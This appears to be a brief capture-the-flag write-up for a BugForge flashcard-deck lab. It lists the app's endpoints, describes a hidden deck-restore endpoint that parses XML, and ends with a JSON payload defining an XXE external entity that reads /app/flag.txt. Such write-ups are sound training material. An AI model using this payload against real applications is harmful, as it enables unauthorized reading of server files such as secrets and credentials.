Hint: Can you restore the deck


## Recon

### Endpoints

- [/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/)
- [//](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io//)
- [/stats](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/stats)
- [/admin](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/admin)
- [/login](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/login)
- [/api/login](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/login)
- [/register](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/register)
- [/api/register](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/register)
- [/api/decks](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/decks)
- [/study/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/study/)
- [/api/decks/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/decks/)
- [/backup](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/backup)
- [/api/study/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/study/)
- [/cards?limit=10](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/cards?limit=10)
- [/api/study/progress](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/study/progress)
- [/api/study/session](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/study/session)
- [/api/stats](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/stats)
- [/api/study/sessions](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/study/sessions)
- [/api/admin/users](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/users)
- [/api/admin/decks](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/decks)
- [/api/admin/cards](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/cards)
- [/api/admin/users/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/users/)
- [/api/admin/decks/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/decks/)
- [/api/admin/cards/](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/admin/cards/)
- [/api/verify-token](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/api/verify-token)
- [/static/js/main.9f7a4f9f.js](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/static/js/main.9f7a4f9f.js)
- [/static/css/main.88b44aa2.css](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/static/css/main.88b44aa2.css)

### Initial discovery
- found an endpoint of /api/decks/:id/restore which was hidden
- when explored 
-
```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE backup [
  
]>
<backup>
```
- the doctype backup seems suspicious.
- while restoring i found the decks content are not restored


### Exploit payload
``` 
{"name":"&xxe;","description":"pwn","category":"pwn","dtd":"<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">"}
```
- with content type application/json